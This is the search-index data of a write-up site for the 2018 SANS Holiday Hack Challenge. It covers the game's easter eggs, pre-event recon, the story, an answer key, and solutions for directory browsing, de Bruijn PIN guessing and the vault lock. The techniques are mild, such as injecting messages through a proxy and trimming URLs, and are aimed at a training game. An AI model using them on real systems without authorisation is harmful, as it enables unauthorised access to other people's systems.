{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"2018 SANS Holiday Hack Challenge Solution A Guide to Solving the 2018 SANS Holiday Hack Challenge - by Dan Roberts This year's Holiday Hack Challenge is in the form of a virtual security conference held by Santa and his elves at the North Pole, for the purpose of securing Christmas from the bad guys who have been trying to ruin the holiday over the past few years. During the conference, it appears that the cast of Die Hard attempts to hijack the conference. Our job is to solve all of the puzzles to reveal the true mastermind beind this plot. In addition to the capture-the-flag style computer security challenges, there are YouTube videos featuring top notch members of the infosec community discussing current security topics. The experience is as much educational as it is entertaining. Thank you to Ed Skoudis, SANS, Counter Hack, the KringleCon speakers, and all of the other talented individuals who made this possible. Thanks also to Google for being a sponsor of the event. If you've somehow found yourself reading this without already attending KringleCon, your next stop should be the Start Here video recorded by Ed Skoudis. Then register for the event yourself, and have some fun before reading the solutions!","title":"Introduction"},{"location":"index.html#2018-sans-holiday-hack-challenge-solution","text":"A Guide to Solving the 2018 SANS Holiday Hack Challenge - by Dan Roberts This year's Holiday Hack Challenge is in the form of a virtual security conference held by Santa and his elves at the North Pole, for the purpose of securing Christmas from the bad guys who have been trying to ruin the holiday over the past few years. During the conference, it appears that the cast of Die Hard attempts to hijack the conference. Our job is to solve all of the puzzles to reveal the true mastermind beind this plot. In addition to the capture-the-flag style computer security challenges, there are YouTube videos featuring top notch members of the infosec community discussing current security topics. The experience is as much educational as it is entertaining. Thank you to Ed Skoudis, SANS, Counter Hack, the KringleCon speakers, and all of the other talented individuals who made this possible. Thanks also to Google for being a sponsor of the event. If you've somehow found yourself reading this without already attending KringleCon, your next stop should be the Start Here video recorded by Ed Skoudis. Then register for the event yourself, and have some fun before reading the solutions!","title":"2018 SANS Holiday Hack Challenge Solution"},{"location":"answers.html","text":"Answers This page serves as a quick reference for answers to the objectives. Happy Trails John McClane Welcome unprepared speaker! Yippee-ki-yay LDUBEJ00320@AD.KRINGLECASTLE.COM 19880715 Fancy Beaver Mary Had a Little Lamb Snort is alerting on all ransomware and only the ransomware! erohetfanu.com Successfully registered yippeekiyaa.aaay! ED#ED#EED#EF#G#F#G#ABA#BA#B You have unlocked Santa's vault! Santa","title":"Answers"},{"location":"answers.html#answers","text":"This page serves as a quick reference for answers to the objectives. Happy Trails John McClane Welcome unprepared speaker! Yippee-ki-yay LDUBEJ00320@AD.KRINGLECASTLE.COM 19880715 Fancy Beaver Mary Had a Little Lamb Snort is alerting on all ransomware and only the ransomware! erohetfanu.com Successfully registered yippeekiyaa.aaay! ED#ED#EED#EF#G#F#G#ABA#BA#B You have unlocked Santa's vault! Santa","title":"Answers"},{"location":"castle.html","text":"Castle During LineCon, Santa's castle could only be seen at a distance from the castle approach area. Once the doors were flung open, we finally got our chance to explore. Here's a not-to-scale map for a general idea of the layout: KringleCon conference talks can be viewed in the rooms numbered 1-7, and each of the other areas contain one or more challenges, except for the mysterious \"old section\" room off the West Wing. This is the only room that is depicted with a flat image rather than 3d game elements (although the posts and Santa's sleigh in the image are curiously overlayed with 3d objects). Some have speculated that the tree shaped door at the far end of the room will open up for the closing ceremonies.","title":"Castle"},{"location":"castle.html#castle","text":"During LineCon, Santa's castle could only be seen at a distance from the castle approach area. Once the doors were flung open, we finally got our chance to explore. Here's a not-to-scale map for a general idea of the layout: KringleCon conference talks can be viewed in the rooms numbered 1-7, and each of the other areas contain one or more challenges, except for the mysterious \"old section\" room off the West Wing. This is the only room that is depicted with a flat image rather than 3d game elements (although the posts and Santa's sleigh in the image are curiously overlayed with 3d objects). Some have speculated that the tree shaped door at the far end of the room will open up for the closing ceremonies.","title":"Castle"},{"location":"eggs.html","text":"Easter Eggs If you couldn't tell, the creators of Holiday Hack Challenge love to hide humor and pop culture references throughout the game for observant players to find. Here are a few I encountered. Jason the Plant Jason has made an appearance in past Holiday Hack Challenges, and this time he's returned as a potted plant at the entrance to Santa's castle. Die Hard The avatars have no shoes. Just like John McClane in the movie, our characters must navigate the world without shoes. \"NOW I HAVE A ZERO-DAY. HO-HO-HO.\" is a nod to the line in Die Hard where John McClane sends a terrorist down the elevator wearing a sweatshirt that says \"NOW I HAVE A MACHINE GUN. HO-HO-HO.\" HoHoHoDaddy phone number The telephone number listed on the HoHoHoDaddy webpage, 115 97 110 116 97, is the hex-encoded text string \"santa\". GitHub repo In addition to the ventilation system schematics, there is code for a drone delivery system under development by the North Pole elves. What could possibly go wrong? A wild MissingNo appears! Manipulating your avatar's DNA to an unsupported value will cause the game to represent you as the MISSINGNO from the Nintendo Pokemon game (more here: https://en.wikipedia.org/wiki/MissingNo ). Unfortunately, server-side input validation prevents us from setting our avatar to MISSINGNO for others to see.. however you could change it client-side and share the image on social media. The easiest way I found to do this was using an interception proxy (shown in ZAP below) to send a WS_USERS WebSockets message toward my client with an invalid DNA string. WebSocket Fun Communication between the client and game server uses WebSockets protocol. Some of the keywords used in the communications were entertaining: WS_OHHIMARK, WAKE_UP_WERE_AT_GRANDMAS, AUF_WIEDERSEHEN, and my favorite: DENNIS_NEDRY , the computer geek gone rogue from Jurassic Park, is the server response when we attempt to update our DNA. I swear I could hear him saying \"Ah ah ah.. You didn't say the magic word!\" Jenny's Number If you take the time to download source.min.html, which is referenced in the wannacookie malware that infected Alabaster's computer, you'll see that the ransomware demands 8675309 Bitcoins to unlock the files it has encrypted. This is the phone number in \"867-5309/Jenny\", the 1980's Tommy Tutone hit. Musical Lock The musical lock for Santa's vault is right out of Willy Wonka and the Chocolate Factory from 1971. In the movie, Mrs. Teavee misidentifies the tune played on the musical lock as Rachmaninoff ( https://www.youtube.com/watch?v=5g4r-FbGivk ). In fact, it's the opening bars of Mozart's Overture from Marriage of Figaro. In his hints, Alabaster makes the same mistake, and then corrects himself. And so many more that I surely missed!","title":"Easter Eggs"},{"location":"eggs.html#easter-eggs","text":"If you couldn't tell, the creators of Holiday Hack Challenge love to hide humor and pop culture references throughout the game for observant players to find. Here are a few I encountered.","title":"Easter Eggs"},{"location":"eggs.html#jason-the-plant","text":"Jason has made an appearance in past Holiday Hack Challenges, and this time he's returned as a potted plant at the entrance to Santa's castle.","title":"Jason the Plant"},{"location":"eggs.html#die-hard","text":"The avatars have no shoes. Just like John McClane in the movie, our characters must navigate the world without shoes. \"NOW I HAVE A ZERO-DAY. HO-HO-HO.\" is a nod to the line in Die Hard where John McClane sends a terrorist down the elevator wearing a sweatshirt that says \"NOW I HAVE A MACHINE GUN. HO-HO-HO.\"","title":"Die Hard"},{"location":"eggs.html#hohohodaddy-phone-number","text":"The telephone number listed on the HoHoHoDaddy webpage, 115 97 110 116 97, is the hex-encoded text string \"santa\".","title":"HoHoHoDaddy phone number"},{"location":"eggs.html#github-repo","text":"In addition to the ventilation system schematics, there is code for a drone delivery system under development by the North Pole elves. What could possibly go wrong?","title":"GitHub repo"},{"location":"eggs.html#a-wild-missingno-appears","text":"Manipulating your avatar's DNA to an unsupported value will cause the game to represent you as the MISSINGNO from the Nintendo Pokemon game (more here: https://en.wikipedia.org/wiki/MissingNo ). Unfortunately, server-side input validation prevents us from setting our avatar to MISSINGNO for others to see.. however you could change it client-side and share the image on social media. The easiest way I found to do this was using an interception proxy (shown in ZAP below) to send a WS_USERS WebSockets message toward my client with an invalid DNA string.","title":"A wild MissingNo appears!"},{"location":"eggs.html#websocket-fun","text":"Communication between the client and game server uses WebSockets protocol. Some of the keywords used in the communications were entertaining: WS_OHHIMARK, WAKE_UP_WERE_AT_GRANDMAS, AUF_WIEDERSEHEN, and my favorite: DENNIS_NEDRY , the computer geek gone rogue from Jurassic Park, is the server response when we attempt to update our DNA. I swear I could hear him saying \"Ah ah ah.. You didn't say the magic word!\"","title":"WebSocket Fun"},{"location":"eggs.html#jennys-number","text":"If you take the time to download source.min.html, which is referenced in the wannacookie malware that infected Alabaster's computer, you'll see that the ransomware demands 8675309 Bitcoins to unlock the files it has encrypted. This is the phone number in \"867-5309/Jenny\", the 1980's Tommy Tutone hit.","title":"Jenny's Number"},{"location":"eggs.html#musical-lock","text":"The musical lock for Santa's vault is right out of Willy Wonka and the Chocolate Factory from 1971. In the movie, Mrs. Teavee misidentifies the tune played on the musical lock as Rachmaninoff ( https://www.youtube.com/watch?v=5g4r-FbGivk ). In fact, it's the opening bars of Mozart's Overture from Marriage of Figaro. In his hints, Alabaster makes the same mistake, and then corrects himself.","title":"Musical Lock"},{"location":"eggs.html#and-so-many-more-that-i-surely-missed","text":"","title":"And so many more that I surely missed!"},{"location":"linecon.html","text":"LineCon Around October, invitations were sent out for the 2018 Holiday Hack Challenge. According to the invitations, attendees were welcome to sign up and explore the virtual world that KringleCon would take place in. The pre-event period became known as LineCon - the sometimes lengthy queue of attendees outside of a convention waiting for the doors to open. This provided some opportunities to kick the tires on the game envrionment and do a little recon work that could possibly help later. From: SANS Institute Subject: SANS Holiday Hack Challenge Sneak-Peak: Register Now for the Fun and Adventure Greetings, Holiday Hackers! It's time to return to the North Pole for a very special event: KringleCon 2018. This year the makers of the SANS Holiday Hack Challenge, NetWars, and SANS Pen Test training courses invite you to a place of wonder, destiny, and hacking magic! Register now at www.kringlecon.com and create your avatar for KringleCon! What is KringleCon? It is a virtual holiday hacking event that will be hosted by Santa and his team at the North Pole in mid-December 2018. Security-minded people and hackers from around the world will come together virtually to help improve the state of cybersecurity worldwide and protect the holidays from dastardly cyber attackers. Registration is completely FREE, but space is limited for this very special event! Why register now when it's not even December? Well now, that's kind of a surprise, and we wouldn't want to ruin it for you\u2026 You can even poke around the KringleCon website and look for a little special magic in this sneak-peak preview. Welcome back to the fun and adventure of the SANS Holiday Hack Challenge!!! REGISTER NOW at www.kringlecon.com to secure your place! Curiosity If you signed up during LineCon, you might have noticed the the registration pages on the KringleCon website incremented in name: two, three, four. I wondered what would happen if I browsed to the next couple pages in logical sequence, and was greeted with a message that said \"You're curious. We like that!\" WebSockets Browsing to kringlecon.com through a web interception proxy, I quickly discovered that client-server communication takes place over WebSockets. A few players took advantage of this open standard to develop bots that could chat with or follow other players around. Besides watching the traffic go back and forth to learn more about what's happening under the hood, the OWASP ZAP proxy also gave me the ability to inject my own messages to either the server or the client. This didn't amount to much aside from moving avatars around on the screen. DNA Each avatar's appearance, the specific combination of head, eyes, mouth, torso, legs and coloration, is encoded in a string that resembles a DNA sequence. The game client reads these sequences from the server so that it knows how to display each player's avatar. Sending an invalid DNA string to the server results in your avatar being set to a random sequence of DNA. Sending an invalid DNA string to the client results in your avatar being changed to MissingNo (see Easter Eggs). DOM manipulation Since so much of the game is run client-side, the world around us is open to manipulation. Many selfies were posted to social media during LineCon, demonstrating what players were able to do. Some very skillful players were able to rearrange massive numbers of avatars in various formations. My skills pale in comparison, but I was able to alter the world enough to capture this shot from the other side of the gates: Using my browser's developer tools, I observed that the camera angle and object orientation in the virtual world are defined by CSS properties. Each set of grid coordinates has a pre-defined set of values that tell the client how to position your avatar and camera view. Once I figured out how to reference these elements, I was able to set my own style properties to override the game's pre-defined settings. document . getElementsByClassName ( camera ). item ( 0 ). style . transform = rotateX(-3deg) rotateY(185deg) rotateZ(0deg) translate3d(-791.667px, 128px, -500px) document . getElementsByClassName ( me ). item ( 0 ). style . transform = scale(-1,1) translate3d(-1000px, 0px, -800px) Another popular trick during LineCon was to make the gate disappear, but of course this was just a visual trick and didn't allow anyone to cross the threshold. document . getElementsByClassName ( gate-section center )[ 0 ]. style . visibility = hidden ; Domain recon While waiting around for KringleCon to begin, I also checked to see if any additional domains had been registered for this year's event. Based on the WHOIS data for kringlecon.com, I performed a reverse WHOIS search, and discovered several domains were created in 2018 with the same Registrant name \"Counter Hack\". Domain Name Creation Date Registrar kinglecon.com 2018-05-25 GODADDY.COM, LLC erohetfanu.com 2018-10-16 GODADDY.COM, LLC kringlecastle.com 2018-10-12 GODADDY.COM, LLC","title":"LineCon"},{"location":"linecon.html#linecon","text":"Around October, invitations were sent out for the 2018 Holiday Hack Challenge. According to the invitations, attendees were welcome to sign up and explore the virtual world that KringleCon would take place in. The pre-event period became known as LineCon - the sometimes lengthy queue of attendees outside of a convention waiting for the doors to open. This provided some opportunities to kick the tires on the game envrionment and do a little recon work that could possibly help later. From: SANS Institute Subject: SANS Holiday Hack Challenge Sneak-Peak: Register Now for the Fun and Adventure Greetings, Holiday Hackers! It's time to return to the North Pole for a very special event: KringleCon 2018. This year the makers of the SANS Holiday Hack Challenge, NetWars, and SANS Pen Test training courses invite you to a place of wonder, destiny, and hacking magic! Register now at www.kringlecon.com and create your avatar for KringleCon! What is KringleCon? It is a virtual holiday hacking event that will be hosted by Santa and his team at the North Pole in mid-December 2018. Security-minded people and hackers from around the world will come together virtually to help improve the state of cybersecurity worldwide and protect the holidays from dastardly cyber attackers. Registration is completely FREE, but space is limited for this very special event! Why register now when it's not even December? Well now, that's kind of a surprise, and we wouldn't want to ruin it for you\u2026 You can even poke around the KringleCon website and look for a little special magic in this sneak-peak preview. Welcome back to the fun and adventure of the SANS Holiday Hack Challenge!!! REGISTER NOW at www.kringlecon.com to secure your place!","title":"LineCon"},{"location":"linecon.html#curiosity","text":"If you signed up during LineCon, you might have noticed the the registration pages on the KringleCon website incremented in name: two, three, four. I wondered what would happen if I browsed to the next couple pages in logical sequence, and was greeted with a message that said \"You're curious. We like that!\"","title":"Curiosity"},{"location":"linecon.html#websockets","text":"Browsing to kringlecon.com through a web interception proxy, I quickly discovered that client-server communication takes place over WebSockets. A few players took advantage of this open standard to develop bots that could chat with or follow other players around. Besides watching the traffic go back and forth to learn more about what's happening under the hood, the OWASP ZAP proxy also gave me the ability to inject my own messages to either the server or the client. This didn't amount to much aside from moving avatars around on the screen.","title":"WebSockets"},{"location":"linecon.html#dna","text":"Each avatar's appearance, the specific combination of head, eyes, mouth, torso, legs and coloration, is encoded in a string that resembles a DNA sequence. The game client reads these sequences from the server so that it knows how to display each player's avatar. Sending an invalid DNA string to the server results in your avatar being set to a random sequence of DNA. Sending an invalid DNA string to the client results in your avatar being changed to MissingNo (see Easter Eggs).","title":"DNA"},{"location":"linecon.html#dom-manipulation","text":"Since so much of the game is run client-side, the world around us is open to manipulation. Many selfies were posted to social media during LineCon, demonstrating what players were able to do. Some very skillful players were able to rearrange massive numbers of avatars in various formations. My skills pale in comparison, but I was able to alter the world enough to capture this shot from the other side of the gates: Using my browser's developer tools, I observed that the camera angle and object orientation in the virtual world are defined by CSS properties. Each set of grid coordinates has a pre-defined set of values that tell the client how to position your avatar and camera view. Once I figured out how to reference these elements, I was able to set my own style properties to override the game's pre-defined settings. document . getElementsByClassName ( camera ). item ( 0 ). style . transform = rotateX(-3deg) rotateY(185deg) rotateZ(0deg) translate3d(-791.667px, 128px, -500px) document . getElementsByClassName ( me ). item ( 0 ). style . transform = scale(-1,1) translate3d(-1000px, 0px, -800px) Another popular trick during LineCon was to make the gate disappear, but of course this was just a visual trick and didn't allow anyone to cross the threshold. document . getElementsByClassName ( gate-section center )[ 0 ]. style . visibility = hidden ;","title":"DOM manipulation"},{"location":"linecon.html#domain-recon","text":"While waiting around for KringleCon to begin, I also checked to see if any additional domains had been registered for this year's event. Based on the WHOIS data for kringlecon.com, I performed a reverse WHOIS search, and discovered several domains were created in 2018 with the same Registrant name \"Counter Hack\". Domain Name Creation Date Registrar kinglecon.com 2018-05-25 GODADDY.COM, LLC erohetfanu.com 2018-10-16 GODADDY.COM, LLC kringlecastle.com 2018-10-12 GODADDY.COM, LLC","title":"Domain recon"},{"location":"narrative.html","text":"Narrative As you complete the objectives, the narrative progressively unfolds inside your badge. The entire story is revealed by the time you've completed all the challenges. Here's the entire story: As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon. Suddenly, all elves in the castle start looking very nervous. You can overhear some of them talking with worry in their voices. The toy soldiers, who were always gruff, now seem especially determined as they lock all the exterior entrances to the building and barricade all the doors. No one can get out! And the toy soldiers' grunts take on an increasingly sinister tone. The toy soldiers act even more aggressively. They are searching for something -- something very special inside of Santa\u2019s castle -- and they will stop at NOTHING until they find it. Hans seems to be directing their activities. In the main lobby on the bottom floor of Santa's castle, Hans calls everyone around to deliver a speech. Make sure you visit Hans to hear his speech. The toy soldiers continue behaving very rudely, grunting orders to the guests and to each other in vaguely Germanic phrases. Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that has written on it in red pen, \"NOW I HAVE A ZERO-DAY. HO-HO-HO.\" A rumor spreads among the elves that Alabaster has lost his badge. Several elves say, \"What do you think someone could do with that?\" Hans has started monologuing again. Please visit him in Santa's lobby for a status update. Great work! You have blocked access to Santa's treasure... for now. Please visit Hans in Santa's Secret Room for an update. And then suddenly, Hans slips and falls into a snowbank. His nefarious plan thwarted, he's now just cold and wet. But Santa still has more questions for you to solve! Congrats! You have solved the hardest challenge! Please visit Santa and Hans inside Santa's Secret Room for an update on your amazing accomplishment!","title":"Narrative"},{"location":"narrative.html#narrative","text":"As you complete the objectives, the narrative progressively unfolds inside your badge. The entire story is revealed by the time you've completed all the challenges. Here's the entire story: As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon. Suddenly, all elves in the castle start looking very nervous. You can overhear some of them talking with worry in their voices. The toy soldiers, who were always gruff, now seem especially determined as they lock all the exterior entrances to the building and barricade all the doors. No one can get out! And the toy soldiers' grunts take on an increasingly sinister tone. The toy soldiers act even more aggressively. They are searching for something -- something very special inside of Santa\u2019s castle -- and they will stop at NOTHING until they find it. Hans seems to be directing their activities. In the main lobby on the bottom floor of Santa's castle, Hans calls everyone around to deliver a speech. Make sure you visit Hans to hear his speech. The toy soldiers continue behaving very rudely, grunting orders to the guests and to each other in vaguely Germanic phrases. Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that has written on it in red pen, \"NOW I HAVE A ZERO-DAY. HO-HO-HO.\" A rumor spreads among the elves that Alabaster has lost his badge. Several elves say, \"What do you think someone could do with that?\" Hans has started monologuing again. Please visit him in Santa's lobby for a status update. Great work! You have blocked access to Santa's treasure... for now. Please visit Hans in Santa's Secret Room for an update. And then suddenly, Hans slips and falls into a snowbank. His nefarious plan thwarted, he's now just cold and wet. But Santa still has more questions for you to solve! Congrats! You have solved the hardest challenge! Please visit Santa and Hans inside Santa's Secret Room for an update on your amazing accomplishment!","title":"Narrative"},{"location":"Objectives/1-orientation.html","text":"Objective #1: Orientation Challenge Problem What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions? For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills terminal challenge. Hints After finishing the Essential Editor Skills terminal challenge, Bushy Evergreen says: Have you taken a look at the Orientation Challenge? This challenge is limited to past SANS Holiday Hack Challenges from 2015, 2016, and 2017. You DO NOT need to play those challenges. If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need... It may take a little poking around, but with your skills, I'm sure it'll be a wintergreen breeze! Bushy also provides a link to Past Holiday Hack Challenges: https://holidayhackchallenge.com/past-challenges/ Solution Answer a multiple choice quiz to complete this challenge. Question 1: In 2015, the Dosis siblings asked for help understanding what piece of their \"Gnome in Your Home\" toy? Answer: FIRMWARE Question 2: In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation? Answer: ATNAS Question 3: In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left? Answer: BUSINESS CARD Question 4: In 2016, Linux terminals at the North Pole could be accessed with what kind of computer? Answer: CRANBERRY PI Question 5: In 2017, the North Pole was being bombarded by giant objects. What were they? Answer: SNOWBALLS Question 6: In 2017, Sam the snowman needed help reassembling pages torn from what? Answer: THE GREAT BOOK After answering the questions, the phrase \"Happy Trails\" is displayed.","title":"Orientation"},{"location":"Objectives/1-orientation.html#objective-1-orientation-challenge","text":"","title":"Objective #1: Orientation Challenge"},{"location":"Objectives/1-orientation.html#problem","text":"What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions? For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills terminal challenge.","title":"Problem"},{"location":"Objectives/1-orientation.html#hints","text":"After finishing the Essential Editor Skills terminal challenge, Bushy Evergreen says: Have you taken a look at the Orientation Challenge? This challenge is limited to past SANS Holiday Hack Challenges from 2015, 2016, and 2017. You DO NOT need to play those challenges. If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need... It may take a little poking around, but with your skills, I'm sure it'll be a wintergreen breeze! Bushy also provides a link to Past Holiday Hack Challenges: https://holidayhackchallenge.com/past-challenges/","title":"Hints"},{"location":"Objectives/1-orientation.html#solution","text":"Answer a multiple choice quiz to complete this challenge. Question 1: In 2015, the Dosis siblings asked for help understanding what piece of their \"Gnome in Your Home\" toy? Answer: FIRMWARE Question 2: In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation? Answer: ATNAS Question 3: In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left? Answer: BUSINESS CARD Question 4: In 2016, Linux terminals at the North Pole could be accessed with what kind of computer? Answer: CRANBERRY PI Question 5: In 2017, the North Pole was being bombarded by giant objects. What were they? Answer: SNOWBALLS Question 6: In 2017, Sam the snowman needed help reassembling pages torn from what? Answer: THE GREAT BOOK After answering the questions, the phrase \"Happy Trails\" is displayed.","title":"Solution"},{"location":"Objectives/10-whodunit.html","text":"Objective #10: Who Is Behind It All? Problem Who was the mastermind behind the whole KringleCon plan? And, in your emailed answers please explain that plan. Hints After solving the ransomware objective, Alabaster provides a hint: I'm seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password? Alabaster provides an additional hint to help us transpose the notes: Really, it's Mozart. And it should be in the key of D, not E. Solution To answer this question, we need to get into Santa's vault. Entering the password we obtained from Alabaster's password database doesn't work directly. The vault lock responds that the tune is good, but we should try again in a different key. Alabaster mentioned Rachmaninoff in the previous objective, but the notes sound a bit more like Mozart, specifically the Overture to Marriage of Figaro , which is in the key of D Major. Using Alabaster's hint about which key to use, let's transpose the notes and try the following instead: DC#DC#DDC#DEF#EF#GAG#AG#A. The Piano Lock responds You have unlocked Santa's vault! and we can now proceed into the vault. Santa was behind the mastermind plan at KringleCon. Once we've completed all of the objectives and enter the vault, Santa explains it all: You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test! You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot! You see, I finally found you! I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers. That\u2019s why we had so many different challenges this year. We needed to find someone with skills all across the spectrum. I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised. And you did! Oh, and those brutish toy soldiers? They are really just some of my elves in disguise. See what happens when they take off those hats? Based on your victory\u2026 next year, I\u2019m going to ask for your help in defending my whole operation from evil bad guys. And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will. You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted? They lived happily ever after. Answer: You have unlocked Santa's vault!","title":"Who is Behind it All?"},{"location":"Objectives/10-whodunit.html#objective-10-who-is-behind-it-all","text":"","title":"Objective #10: Who Is Behind It All?"},{"location":"Objectives/10-whodunit.html#problem","text":"Who was the mastermind behind the whole KringleCon plan? And, in your emailed answers please explain that plan.","title":"Problem"},{"location":"Objectives/10-whodunit.html#hints","text":"After solving the ransomware objective, Alabaster provides a hint: I'm seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password? Alabaster provides an additional hint to help us transpose the notes: Really, it's Mozart. And it should be in the key of D, not E.","title":"Hints"},{"location":"Objectives/10-whodunit.html#solution","text":"To answer this question, we need to get into Santa's vault. Entering the password we obtained from Alabaster's password database doesn't work directly. The vault lock responds that the tune is good, but we should try again in a different key. Alabaster mentioned Rachmaninoff in the previous objective, but the notes sound a bit more like Mozart, specifically the Overture to Marriage of Figaro , which is in the key of D Major. Using Alabaster's hint about which key to use, let's transpose the notes and try the following instead: DC#DC#DDC#DEF#EF#GAG#AG#A. The Piano Lock responds You have unlocked Santa's vault! and we can now proceed into the vault. Santa was behind the mastermind plan at KringleCon. Once we've completed all of the objectives and enter the vault, Santa explains it all: You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test! You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot! You see, I finally found you! I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers. That\u2019s why we had so many different challenges this year. We needed to find someone with skills all across the spectrum. I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised. And you did! Oh, and those brutish toy soldiers? They are really just some of my elves in disguise. See what happens when they take off those hats? Based on your victory\u2026 next year, I\u2019m going to ask for your help in defending my whole operation from evil bad guys. And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will. You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted? They lived happily ever after. Answer: You have unlocked Santa's vault!","title":"Solution"},{"location":"Objectives/2-cfp.html","text":"Objective #2: Directory Browsing Problem Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out (https://cfp.kringlecastle.com/). For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game terminal challenge. Hints After completing The Name Game challenge, Minty Candycane provides the following hint: Thank you so much for your help! I've gotten Mr. Chan his name tag. I'd love to repay the favor. Have you ever visited a website and seen a listing of files - like you're browsing a directory? Sometimes this is enabled on web servers. This is generally unwanted behavior. You can find sleighloads of examples by searching the web for index.of. On a website, it's sometimes as simple as removing characters from the end of a URL. What a silly misconfiguration for leaking information! Minty provides another hint: On a website, finding browsable directories is sometimes as simple as removing characters from the end of a URL. Minty also provides a link to a webpage on Website Directory Browsing: https://portswigger.net/kb/issues/00600100_directory-listing Solution Browse to the URL provided. The Apply Now link on this page takes us to https://cfp.kringlecastle.com/cfp/cfp.html. Remove cfp.html from the end of the URL, and a directory listing appears that includes the file rejected-talks.csv. Inside the CSV file, each row represents a rejected talk; columns 7 8 are the candidate's first and last name, followed by the talk's title in column 9. Use Ctrl+F in the browser to search through the text for \"Data Loss for Rainbow Teams: A Path in the Darkness\", and we find the answer is John McClane .","title":"Directory Browsing"},{"location":"Objectives/2-cfp.html#objective-2-directory-browsing","text":"","title":"Objective #2: Directory Browsing"},{"location":"Objectives/2-cfp.html#problem","text":"Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out (https://cfp.kringlecastle.com/). For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game terminal challenge.","title":"Problem"},{"location":"Objectives/2-cfp.html#hints","text":"After completing The Name Game challenge, Minty Candycane provides the following hint: Thank you so much for your help! I've gotten Mr. Chan his name tag. I'd love to repay the favor. Have you ever visited a website and seen a listing of files - like you're browsing a directory? Sometimes this is enabled on web servers. This is generally unwanted behavior. You can find sleighloads of examples by searching the web for index.of. On a website, it's sometimes as simple as removing characters from the end of a URL. What a silly misconfiguration for leaking information! Minty provides another hint: On a website, finding browsable directories is sometimes as simple as removing characters from the end of a URL. Minty also provides a link to a webpage on Website Directory Browsing: https://portswigger.net/kb/issues/00600100_directory-listing","title":"Hints"},{"location":"Objectives/2-cfp.html#solution","text":"Browse to the URL provided. The Apply Now link on this page takes us to https://cfp.kringlecastle.com/cfp/cfp.html. Remove cfp.html from the end of the URL, and a directory listing appears that includes the file rejected-talks.csv. Inside the CSV file, each row represents a rejected talk; columns 7 8 are the candidate's first and last name, followed by the talk's title in column 9. Use Ctrl+F in the browser to search through the text for \"Data Loss for Rainbow Teams: A Path in the Darkness\", and we find the answer is John McClane .","title":"Solution"},{"location":"Objectives/3-sequence.html","text":"Objective #3: de Bruijn Sequences Problem When you break into the speaker unpreparedness room, what does Morcel Nougat say? For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge. Hints Tangle Coalbox provides the following hint: Have you been able to solve the lock with the funny shapes? It reminds me of something called \"de Bruijn Sequences.\" You can optimize the guesses because there is no start and stop -- each new value is added to the end and the first is removed. I've even seen de Bruijn sequence generators online. Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well. Mathematically this is k=4, n=4 to generate the de Bruijn sequence. Math is like your notepad and pencil - can't leave home without it! Tangle also provides a link to a webpage on how you can open a Ford vehicle with a robot and the de Bruign Sequence https://hackaday.com/2018/06/18/opening-a-ford-with-a-robot-and-the-de-bruijn-sequence/ Tangle also provides a link to a de Bruijn Sequence generator: http://www.hakank.org/comb/debruijn.cgi Solution The challenge is to come up with the correct combination to unlock the door to the Speaker Unpreparedness Room. Visit the sequence generator page that Tangle provided, and enter a value of 4 for both k (alphabet size) and n (word length). This produces the following sequence: 0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 (0 0 0) Now, assign a digit to each of the buttons on the door lock (triangle=0, square=1, circle=2, star=3). The first door password attempt is the first four digits of the sequence (0 0 0 0), 